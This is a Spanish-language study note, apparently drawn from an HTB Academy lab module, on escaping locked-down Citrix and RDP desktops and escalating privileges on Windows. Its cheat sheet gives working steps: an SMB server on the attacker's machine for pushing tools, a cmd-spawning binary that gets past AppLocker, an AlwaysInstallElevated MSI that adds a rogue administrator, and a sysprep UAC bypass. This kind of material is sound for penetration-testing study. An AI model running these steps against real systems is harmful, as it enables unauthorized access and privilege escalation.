---
tags:
  - windows
  - privex
---
## Conceptos Clave (TL;DR)

- Las plataformas de virtualización/acceso remoto (Citrix, RDP, Terminal Services, AWS AppStream, CyberArk PSM, Kiosk) suelen implementar "lockdown" de escritorio (GPO) para limitar el radio de acción de un usuario malicioso o cuenta comprometida.
- Metodología base de evasión (3 fases): 1) Obtener un **Cuadro de Diálogo** nativo de Windows, 2) Explotar ese diálogo para lograr **ejecución de comandos** (cmd.exe/powershell.exe), 3) **Escalar privilegios** para obtener mayor nivel de acceso.
- Cualquier función de aplicación que invoque archivos (Guardar, Guardar Como, Abrir, Cargar, Explorar, Importar, Exportar, Ayuda, Buscar, Escanear, Imprimir) puede abrir un cuadro de diálogo de Windows explotable. Apps comunes: Paint, Notepad, Wordpad.
- Una vez se obtiene shell (cmd/powershell), el objetivo es: recolectar información, transferir herramientas (vía SMB), enumerar privesc y escalar (AlwaysInstallElevated, UAC bypass, etc.).

## Herramientas Clave

- **smbserver.py (Impacket)**: levanta un servidor SMB en la máquina atacante para servir/transferir herramientas hacia el entorno restringido.
- **MS Paint / Notepad / Wordpad**: usados para invocar el cuadro de diálogo "Abrir"/"Guardar como" y así obtener acceso al sistema de archivos.
- **Explorer++ / Q-Dir**: exploradores de archivos alternativos y portables; permiten copiar/navegar archivos saltando restricciones de GPO sobre el Explorador de Windows nativo.
- **Simpleregedit / Uberregedit / SmallRegistryEditor**: editores de registro GUI alternativos, útiles cuando `regedit.exe` está bloqueado por política de grupo.
- **PowerUp.ps1**: enumeración de vectores de escalada de privilegios en Windows (detecta AlwaysInstallElevated, etc.) y explotación directa (función `Write-UserAddMSI`).
- **WinPEAS**: enumeración automatizada de privesc (mencionado como alternativa a PowerUp).
- **Bypass-UAC.ps1**: script con múltiples métodos para evadir el Control de Cuentas de Usuario (UAC).
- **pwn.exe (compilado de pwn.c)**: binario custom que simplemente llama `system("cmd.exe")`; útil para abrir una consola con clic derecho > Abrir desde un recurso SMB, sin depender de accesos directos a cmd.exe que suelen estar bloqueados.
- **runas**: lanza un proceso (cmd) como otro usuario usando sus credenciales.

## Metodología Paso a Paso

### Fase 1 — Obtener un Cuadro de Diálogo y ejecución de comandos
1. Descartar primero rutas "fáciles": buscar acceso directo a `cmd.exe`/`powershell.exe` en el Menú de Inicio (rara vez disponible en entornos bien endurecidos).
2. Intentar navegar directamente a `C:\Users` o `C:\Windows\system32` desde el Explorador de archivos — normalmente bloqueado por GPO ("Acceso denegado").
3. Abrir una app nativa con función de archivo (ej. Paint) y entrar a su diálogo nativo (Archivo > Abrir).
4. Dentro del campo "Nombre de archivo" del diálogo, introducir una ruta UNC local (ej. `\\127.0.0.1\c$\users\<USER>`) con "Tipo de archivo" = **Todos los archivos**. Esto evade las restricciones de navegación que sí aplican al Explorador estándar.

### Fase 2 — Transferencia de herramientas vía SMB
1. En la máquina atacante (Linux), levantar un servidor SMB con Impacket apuntando al directorio de herramientas.
2. Desde el diálogo de Windows (Paint > Archivo > Abrir), introducir la ruta UNC `\\<ATTACKER_IP>\share` para listar el contenido del compartido remoto.
3. Si la copia directa de archivos está bloqueada por el Explorador restringido: hacer clic derecho sobre un ejecutable del share (ej. `pwn.exe`) y elegir "Abrir" — esto ejecuta el binario directamente desde la ruta UNC y abre una consola CMD (con el directorio de Windows como working dir por defecto).
4. Desde el CMD obtenido, copiar las herramientas necesarias (PowerUp.ps1, Bypass-UAC.ps1, etc.) desde el share hacia el Desktop del usuario actual.
5. Alternativa más cómoda: montar/navegar el share usando **Explorer++** (portable, sin instalación) para copiar archivos sin las restricciones que sufre el Explorador nativo.

### Fase 3 — Vectores adicionales: shortcuts, scripts y registro
1. **Modificar un .lnk existente**: clic derecho sobre el acceso directo > Propiedades > campo "Destino" > apuntar a `C:\Windows\System32\cmd.exe` > ejecutar el shortcut para obtener consola.
2. Si no hay ningún `.lnk` disponible: transferir uno ya preparado vía SMB, o generar uno nuevo con PowerShell (técnica de "Generating a Malicious .lnk File").
3. **Ejecución de scripts**: si extensiones como `.bat`, `.vbs` o `.ps1` se auto-ejecutan con su intérprete asociado, crear un `.bat` con el contenido `cmd` y ejecutarlo para abrir una consola interactiva.
4. Si el Editor del Registro nativo (`regedit.exe`) está bloqueado por GPO, usar un editor alternativo (Simpleregedit, Uberregedit, SmallRegistryEditor) para modificar claves sin restricción.

### Fase 4 — Escalada de privilegios (Local Privesc)
1. Con acceso a CMD/PowerShell, ejecutar WinPEAS y/o PowerUp.ps1 para enumerar vectores de privesc.
2. Verificar específicamente la clave **AlwaysInstallElevated** (vía PowerUp y validación manual por registro en HKCU y HKLM — debe estar habilitada en **ambas** para ser explotable).
3. Si está habilitada en ambas claves, usar la función `Write-UserAddMSI` de PowerUp para generar un `.msi` malicioso en el Desktop.
4. Ejecutar el `.msi` (doble clic) y completar el diálogo "User Add" con un usuario y contraseña que cumpla la política de complejidad — el usuario se crea automáticamente en el grupo Administradores local.
5. Usar `runas` con las credenciales del nuevo usuario administrador para abrir una consola elevada localmente.

### Fase 5 — Bypass de UAC
1. Aunque el nuevo usuario pertenezca al grupo Administradores, **UAC** seguirá bloqueando el acceso a recursos protegidos (ej. `C:\Users\Administrator` → "Access is denied").
2. Importar un script de bypass de UAC y ejecutar el método correspondiente.
3. Tras un bypass exitoso, se abre una nueva consola (PowerShell/CMD) con privilegios elevados.
4. Confirmar el nivel de privilegios obtenido.
5. Acceder ya sin restricciones a directorios protegidos.

## Cheat Sheet de Comandos

```bash
# Levantar servidor SMB (Impacket) en el directorio actual del atacante,
# con soporte SMBv2 y nombre de share "share", para servir herramientas
# al entorno Citrix restringido.
smbserver.py -smb2support share $(pwd)
```

```text
# Ruta UNC a introducir en el campo "Nombre de archivo" de un diálogo
# nativo de Windows (Paint/Notepad) para navegar localmente al disco C:
# (recuerda poner "Tipo de archivo" = Todos los archivos antes de Enter).
\\127.0.0.1\c$\users\<USER>
```

```text
# Ruta UNC a introducir en el mismo diálogo para acceder al share SMB
# levantado en la máquina atacante con smbserver.py.
\\<ATTACKER_IP>\share
```

```c
// Código fuente de un binario "dropper" mínimo (compilar como pwn.exe).
// Al ejecutarse (clic derecho > Abrir desde el share), invoca cmd.exe
// y abre una consola interactiva, útil cuando el acceso directo a
// cmd.exe está bloqueado pero ejecutar un .exe arbitrario no lo está.
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

```cmd
:: Validar manualmente (vía registro) si AlwaysInstallElevated está
:: habilitado a nivel de usuario actual (HKCU).
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: Validar la misma clave a nivel de máquina (HKLM). Para que el
:: vector AlwaysInstallElevated sea explotable, AMBAS claves deben
:: existir con valor REG_DWORD 0x1.
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
# Importar el módulo PowerUp.ps1 (ya transferido al Desktop del usuario)
# para disponer de sus funciones de enumeración/explotación de privesc.
PS C:\Users\<USER>\Desktop> Import-Module .\PowerUp.ps1

# Generar un instalador .msi malicioso que, al ejecutarse, crea un
# nuevo usuario local en el grupo Administradores (aprovecha
# AlwaysInstallElevated). El .msi se genera en el directorio actual.
PS C:\Users\<USER>\Desktop> Write-UserAddMSI
```

```cmd
:: Lanzar una consola CMD como el nuevo usuario administrador creado
:: (vía el .msi), usando sus credenciales conocidas.
C:\> runas /user:<NEW_ADMIN_USER> cmd
:: Solicita interactivamente: Enter the password for <NEW_ADMIN_USER>: <NEW_ADMIN_PASSWORD>
```

```powershell
# Importar el script de bypass de UAC ya transferido al sistema.
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1

# Ejecutar el método de bypass UacMethodSysprep (suplanta explorer.exe,
# coloca una DLL proxy y dispara sysprep para obtener un proceso
# elevado sin el prompt de consentimiento de UAC).
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

```cmd
:: Verificar el nivel de privilegios/tokens obtenidos tras el bypass de UAC.
C:\> whoami /all
C:\> whoami /priv
```

## Gotchas y Troubleshooting

- Tras generar la máquina objetivo (entorno Citrix de laboratorio), **esperar ~5 minutos** antes de interactuar; ignorar el mensaje de licencia que pueda aparecer al conectar.
- En el cuadro de diálogo (Paint, etc.), el campo **"Tipo de archivo" debe configurarse como "Todos los archivos"**; de lo contrario el filtro por defecto (ej. solo imágenes) ocultará ejecutables, scripts y otros tipos de archivo necesarios.
- La **navegación** vía Explorador/diálogo puede estar permitida pero la **copia directa de archivos** puede seguir bloqueada por GPO; en ese caso usar clic derecho > Abrir sobre el ejecutable (no copiar/pegar), o recurrir a un explorador alternativo como **Explorer++**.
- `pwn.exe` debe ser un binario **compilado a medida**: ejecutar `cmd.exe` directamente desde el share puede estar bloqueado por aplicación/AppLocker, pero un ejecutable "inocuo" que internamente invoca `system("cmd.exe")` a menudo no está en la lista de bloqueo.
- El vector **AlwaysInstallElevated** solo es explotable si la clave `REG_DWORD AlwaysInstallElevated = 0x1` está presente en **ambas** ubicaciones: `HKCU\...\Installer` y `HKLM\...\Installer`. Si falta en una de las dos, el ataque MSI no funcionará.
- Al crear el usuario con `Write-UserAddMSI`, la **contraseña debe cumplir la política de complejidad** del dominio/máquina; si no la cumple, el proceso de creación del usuario fallará con error.
- Ser miembro del grupo **Administradores no implica bypass de UAC**: directorios protegidos (ej. `C:\Users\Administrator`) seguirán devolviendo "Access is denied" hasta ejecutar un bypass de UAC explícito (ej. `Bypass-UAC.ps1`).
- Si el **Editor de Registro** estándar (`regedit.exe`) está bloqueado por política de grupo, usar herramientas GUI alternativas (Simpleregedit, Uberregedit, SmallRegistryEditor) en lugar de intentar forzar el nativo.
- Si no existe ningún acceso directo (`.lnk`) previo en el escritorio para modificar, transferir uno desde el servidor SMB del atacante o crear uno nuevo vía PowerShell.
- Recursos de referencia (HTB Academy): módulos "Evasión de Citrix y otros entornos de escritorio restringidos" y "Evasión de entornos Windows".